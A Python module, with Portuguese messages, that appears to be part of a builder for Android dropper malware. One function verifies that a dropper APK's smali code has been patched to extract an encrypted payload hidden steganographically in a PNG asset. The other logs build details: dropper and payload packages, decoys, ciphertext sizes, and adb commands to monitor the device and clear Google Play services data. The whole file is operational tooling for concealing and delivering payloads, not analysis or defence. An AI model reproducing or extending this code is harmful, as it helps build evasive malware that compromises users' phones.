
from __future__ import annotations

import json
import os
import re
from datetime import datetime, timezone

from config import BASE_DIR, Config

_LOG_DIR = os.path.join(BASE_DIR, "logs")
_STEGO_MARKER = "# stego_extract"

def ensure_pp_log_dir() -> str:
    os.makedirs(_LOG_DIR, exist_ok=True)
    return _LOG_DIR

def verify_tp_stego_patch(dropper_work: str, *, stego_offset: int) -> dict:
    path = os.path.join(dropper_work, "smali", "tp.smali")
    result = {
        "tp_smali": path,
        "ok": False,
        "stego_offset": stego_offset,
        "offset_hex": f"0x{stego_offset:x}",
        "errors": [],
    }
    if not os.path.isfile(path):
        result["errors"].append("tp.smali ausente")
        return result

    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()

    if _STEGO_MARKER not in content:
        result["errors"].append("marcador stego_extract ausente")
        return result

    method_match = re.search(
        r"\.method public final i\(Ljava/lang/Object;\)Ljava/lang/Object;\s*\n\s*\.locals (\d+)",
        content,
    )
    if not method_match:
        result["errors"].append("metodo tp.i() nao encontrado")
        return result

    locals_count = int(method_match.group(1))
    result["locals"] = locals_count
    if locals_count < 10:
        result["errors"].append(f".locals {locals_count} < 10 (registers insuficientes)")

    offset_needle = f"const v7, {result['offset_hex']}"
    if offset_needle not in content:
        result["errors"].append(f"offset {result['offset_hex']} nao patchado em tp.smali")

    if "invoke-static {v2, v7, v6, v9, v8}, Ljava/lang/System;->arraycopy" not in content:
        result["errors"].append("arraycopy stego ausente")

    idx = content.find(_STEGO_MARKER)
    after = content[idx : idx + 800]
    if "move-result-object v2" not in content[:idx]:
        result["errors"].append("slice stego nao esta apos toByteArray (v2)")

    if ":try_end_0" in after and after.find(":try_end_0") < after.find("invoke-virtual {v2}"):
        pass
    close_before_slice = content.find("invoke-interface {v0}", idx)
    if close_before_slice != -1 and close_before_slice < idx:
        result["errors"].append("v0 (InputStream) pode ser corrompido antes do close")

    result["ok"] = not result["errors"]
    return result

def write_pp_build_log(
    build_id: str,
    *,
    new_package: str,
    asset_name: str,
    stego_offset: int,
    stego_size: int,
    cover_size: int,
    ciphertext_size: int,
    decoys: list[str],
    payload_package: str,
    launch_class: str,
    patch_check: dict,
    output_apk: str | None = None,
) -> str:
    log_dir = ensure_pp_log_dir()
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    path = os.path.join(log_dir, f"pp_build_{build_id}_{ts}.json")
    payload = {
        "build_id": build_id,
        "timestamp_utc": ts,
        "dropper_package": new_package,
        "payload_package": payload_package,
        "launch_class": launch_class,
        "stego_asset": asset_name,
        "stego_offset": stego_offset,
        "stego_offset_hex": f"0x{stego_offset:x}",
        "cover_png_bytes": cover_size,
        "ciphertext_bytes": ciphertext_size,
        "stego_png_bytes": stego_size,
        "decoys": decoys,
        "patch_verification": patch_check,
        "output_apk": output_apk,
        "adb_monitor": f"./tools/monitor_pp.sh <serial> {new_package}",
        "adb_clear_gms": "./tools/monitor_pp.sh --clear <serial>",
    }
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(payload, handle, indent=2, ensure_ascii=False)
        handle.write("\n")
    print(f"[build {build_id}] pp_monitor log -> {path}")
    return path
